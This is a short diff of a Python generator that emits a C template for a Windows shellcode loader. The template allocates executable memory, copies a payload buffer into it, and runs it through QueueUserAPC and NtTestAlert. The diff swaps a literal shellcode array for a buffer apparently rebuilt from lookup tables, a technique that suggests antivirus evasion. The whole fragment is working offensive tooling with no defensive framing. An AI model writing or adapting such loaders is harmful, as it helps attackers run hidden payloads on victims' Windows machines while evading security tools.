@@ -3,7 +3,7 @@ def get():
     c_code = '''
 #include <windows.h>
 #include <stdio.h>
-char shellcode[]="";
+
 typedef VOID(NTAPI* pNtTestAlert)(VOID);
 <TABLES>
 int main() {
@@ -16,7 +16,7 @@ int main() {
 	
 	pNtTestAlert NtTestAlert = (pNtTestAlert)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtTestAlert");
 	LPVOID lpBaseAddress = VirtualAlloc(NULL, sizeof(lpBuffer), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-	memcpy(lpBaseAddress, shellcode, sizeof(lpBuffer));
+	memcpy(lpBaseAddress, lpBuffer, sizeof(offset_table));
 	QueueUserAPC((PAPCFUNC)lpBaseAddress, GetCurrentThread(), NULL);
 	
 	NtTestAlert();
